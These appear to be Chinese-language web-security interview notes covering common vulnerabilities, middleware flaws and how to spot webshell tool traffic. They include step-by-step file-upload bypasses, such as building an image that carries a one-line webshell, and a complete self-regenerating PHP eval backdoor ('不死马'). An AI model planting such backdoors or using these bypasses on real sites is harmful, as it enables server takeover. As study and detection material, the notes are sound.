## SQL

##### MySQL的网站中，5.0以下与5.0以上有什么区别？

5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。















## XSS

通过添加或修改页面JavaScript的恶意脚本，在浏览器渲染页面的时候执行，从而实现窃取cookie





## CSRF

csrf与xss的区别在于：xss是盗取用户cookie值然后登录网页进行破坏，攻击者算是盗取到了用户的权限；csrf是借用用户的权限进行攻击，攻击者没有盗取到用户的权限。

<img src="hw/jpg/1.png" width="20%" height="20%"/>

防止csrf攻击：

可以设置token值；

还有就是在登录重要网站时不能随便点击别人发的链接；

在密码登录的时候加上验证码；

还有敏感信息修改时需要加上二次验证；





## SSRF（服务器端请求伪造）

攻击流程：攻击者----服务器------目标地址

攻击者将要获取信息的网址传入服务器，服务器对目标网址发起请求然后返回数据

原因：没对服务端访问的其他目标站点做过滤与限制

对目标站点做好过滤，或者指定目标站点













## REC

原理： 因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。

分为远程代码执行和远程系统命令执行

防止方法有执行严格的白名单



## 文件包含漏洞

本地文件包含

在url栏中写入本地含有的php可执行命令

未对传进来的变量做处理，直接包含了。

我们可以制定严格的白名单指定文件名



远程文件包含

在远程服务器上写入可执行php文件，比如一句话木马，然后将文件所在网址

复制到要攻击的网站url栏可执行远程文件包含漏洞的地方



不能把文件包含函数对应的文件放在前端选择和操作

过滤../../这些与本地文件包含漏洞有关的命令

白名单仅包含指定运行的文件

配置网站php.ini文件，都关闭掉，像：allow_url_fopen=off   ；  allow_url_include=off 这些



## 不安全的文件下载

原理是没对前端传进来的文件进行判断，没判断是否在下载范围内，直接读取导致内部文件信息的泄露



对传入文件名进行过滤

对文件下载目录进行限定



## 文件上传

原理：在文件上传的地方，服务端脚本语言没对文件类型进行严格的验证和过滤，导致攻击者上传了恶意脚本文件时，从而得到服务端命令执行的能力。



mime型验证：先上传一句话.php，点击上传，然后用bp抓包，再修改content-Type里的内容为image/jpg

最后放包，然后用蚁剑连接

前端限制：打开源代码控制台，删除相关限制函数，再进行上传

getimagesize型验证：在CMD命令中输入:copy /b 1.jpg + yijuhua.php 2.jpg

来生成2.jpg这个包含一句话木马的图片，然后上传，再利用本地文件包含漏洞进行利用



 ::$DATA用在什么系统，什么原理？

::$DATA是Windows系统中的一个特性。当文件名后加上::$DATA时，Windows会把::$DATA之后的数据当成文件流处理，不会检测后缀名，且保持::$DATA之前的文件名。例如，当文件名为phpinfo.php::$DATA时，Windows会自动去掉末尾的::$DATA变成phpinfo.php。





## 越权漏洞

平行越权：a与b权限同级，B越权操作A个人信息的行为叫平行越权

B登录上去后，在URL栏将信息改成A的然后进行访问，即可查询到A的个人信息

垂直越权：A权限高于B，B越权操作A个人信息的行为叫垂直越权

抓取管理员A的数据包，得到A操作的cookie值，然后在B登录后抓取包替换上A的cookie值然后放包，就可以复现管理员A的行为

垂直越权限制太大，运用场景少



越权漏洞属于逻辑漏洞，是权限校验不严谨导致的



## XXE漏洞

原理：某些应用程序在解析xml文件时，没对上传的xml文件进行过滤处理，导致上传的xml文件可能包含某些命令可以加载恶意外部实体文件。

可以利用这个漏洞读取本地文件、php文件、内部开放端口这些，还有就是ddos攻击



防范：

1、禁止加载外部实体；
 2、不允许XML中含有任何自己声明的DTD。





## 当你是蓝队领班，此时网站被getshell后你该怎么处理？

应急响应





## 了解内网渗透和免杀吗？







## 不死马（内存马的一种，基于php）可以用来维权

由客户端发起的Web请求后，中间件的各个独立的组件如Listener、Filter、Servlet等组件会在请求过程中做监听、判断、过滤等操作，内存马就是利用请求过程在内存中修改已有的组件或动态注册一个新的组件，插入恶意的shellcode，达到持久化控制服务器的目的。

```
<?php
ignore_user_abort(true);
set_time_limit(0);
@unlink(__FILE__);
$file = '.HH.php';
$code = '<?php @eval($_POST[\'c\']); ?>';
while (1){
    file_put_contents($file,$code);
    usleep(5000);
}
?>
```



在访问PHP文件的话 会生成一个.HH.php文件，然后会把自身文件删除，然后就可以用菜刀连接.HH.php，删除.HH.php文件的话他会不断生成 .HH.php。

内存马排查思路： 先判断是通过什么方法注入的内存马，可以先查看web日志是否有可疑的web访问日志，如果是filter或者listener类型就会有大量url请求路径相同参数不同的，或者页面不存在但是返回200的，查看是否有类似哥斯拉、冰蝎相同的url请求，哥斯拉和冰蝎的内存马注入流量特征与普通webshell的流量特征基本吻合。通过查找返回200的url路径对比web目录下是否真实存在文件，如不存在大概率为内存马。如在web日志中并未发现异常，可以排查是否为中间件漏洞导致代码执行注入内存马，排查中间件的error.log日志查看是否有可疑的报错，根据注入时间和方法根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。




# 中间件漏洞

## 	IIS



PUT漏洞

短文件名猜解

远程代码执行：在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，从而导致远程代码执行。

解析漏洞：对含有特殊字符的路径进行处理时会出现逻辑错误，从而造成解析漏洞。（上传名为 "test.asp;.jpg" 的文件，虽然该文件真正的后缀名是 ".jpg", 但由于含有特殊符号 ";" ，仍会被 IIS 当做 asp 程序执行。）



## apache



解析漏洞：有些用户的配置有问题

目录遍历：也是配置有错导致的



## Nginx



文件解析：当文件配置中security.limit_extensions = .php这一选项没有，则可以在网站根目录里建一个shell.jpg文件，在里面写入phpinfo()，然后打开，然后利用文件解析漏洞，输入url后面跟上shell.jpg/2.php，网站就会执行之前写入的命令

目录遍历：也是配置上的问题

CRLF注入



## tomcat



远程代码执行：要求tomcat运行在Windows上，并且启用了HTTP put请求方法，可以通过构造的攻击命令向服务器上传任意代码的jsp文件，造成任意代码执行。

war后门文件部署



## jboss



反序列化：在序列化和反序列化的过程中，过滤不严格，可能会导致恶意构造的代码出现。（访问url/invoker/readonly，返回500，说明页面存在，此页面有反序列化漏洞）

war后门文件部署：如果jBoss后台管理页面存在弱口令，可以通过爆破获得账号密码。登陆后台上传包含后门的war包



## shiro

550原理：导致shiro反序列化的主要原因就是shiro提供的记住密码功能，当用户打开这个功能时会在请求阿包中生成一个cookie，cookie的value值是经过反序列->aes加密->base64加密后的字符串，关键在于aes加密的秘钥是默认的，如果没有修改这个秘钥，就会导致反序列化漏洞，攻击者可以构造恶意代码，将恶意代码序列化-aes加密-base64加密后传入cookie，这样就导致RCE漏洞。

550和721的区别？

这两个漏洞主要区别在于Shiro550使用已知密钥碰撞，只要有足够密钥库（条件较低），不需要Remember Cookie。Shiro721的aes加密的key基本猜不到，系统随机生成，可使用登录后rememberMe去爆破正确的key值，即利用有效的RememberMe Cookie作为Padding Oracle Attack的前缀，然后精心构造 RememberMe Cookie 值来实现反序列化漏洞攻击，难度高。



## Log4j2漏洞复现

##### 漏洞大致利用流程：

第一步：向目标发送指定payload，目标对payload进行解析执行，然后会通过ldap链接远程服务，当ldap服务收到请求之后，将请求进行重定向到恶意 java class的地址。

第二步：目标服务器收到重定向请求之后，下载恶意class并执行其中的代码，从而执行系统命令。











## weblogic



反序列化

任意文件上传

war后门文件部署：如果后台管理页面存在弱口令，可以通过爆破获得账号密码。登陆后台上传包含后门的war包





## 菜刀、冰蝎、蚁剑、哥斯拉的流量特征



### 菜刀（cknife)

现在是base64流量加密，流量大，可用base64解码

shell 特征就是传输参数名为 z0，还存在int_set("display_erros","0")字符串特征



### 蚁剑

只了解php是通过base64流量加密

可以对流量进行加密、混淆。但是有些关键代码没有被加密，比如：

```
php ini_set、set_time_limit

asp OnError ResumeNext，response

蚁剑混淆加密后还有一个比较明显的特征，就是参数名大多以“_0x.....=”这种形式，所以，以_0x开头的参数名，后面为加密数据的数据包也可识别为蚁剑的流量特征
```



### 冰蝎

#### 2.0

通过AES对称加密发起三次请求，第一次请求服务端产生密钥写入 session，session 和当前会话绑定，不同的客户端的密钥也是不同的；第二次请求是为了获取 key；第三次使用 key 的 aes 加密进行通信

#### 3.0

使用 aes 加密发起两次请求

3.0 分析流量发现相比 2.0 少了动态密钥的获取的请求，不再使用随机生成 key，改为用连接密码 md5 加密后的前 16 位值作为密钥

冰蝎数据包总是伴随着大量的content-type：application什么什么，无论GET还是POST，请求的http中，content-type为application/octet-stream；

content-length 请求长度，对于密钥交互，获取基本信息来讲，payload都为固定长度，所以我们可以看多个数据包中payload是不是固定长度就行



### 哥斯拉

采用了和冰蝎 3.0 一样的密钥交换方式，哥斯拉建立连接时会发起三次请求，第一次请求数据超级长，建立 session，第二三次请求确认连接

jsp文件里有"pass="，而且发起连接时服务器返回的Content-Length是0

判断它是基于什么方法注入的内存马，可以查看web日志是否有可疑的web访问日志，如果是filter或者listener类型就会有大量url请求路径相同参数不同的，或者页面不存在但是返回200的，查看是否有类似哥斯拉、冰蝎相同的url请求，哥斯拉和冰蝎的内存马注入流量特征与普通webshell的流量特征基本吻合。
通过查找返回200的url路径对比web目录下是否真实存在文件，如不存在大概率为内存马。如在web日志中并未发现异常，可以排查是否为中间件漏洞导致代码执行注入内存马，排查中间件的error.log日志查看是否有可疑的报错，根据注入时间和方法，根据业务使用的组件，排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。
